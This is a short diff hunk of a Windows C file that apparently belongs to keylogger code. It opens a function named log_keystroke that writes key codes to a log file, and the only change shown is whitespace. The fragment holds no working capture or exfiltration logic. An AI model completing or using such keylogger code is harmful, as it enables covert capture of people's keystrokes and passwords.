@@ -1,6 +1,6 @@
 #include <stdio.h>
 #include <windows.h>
-
+ 
 void log_keystroke(int key, FILE *logfile) 
 {
       if ((key >= 39) && (key <= 64))
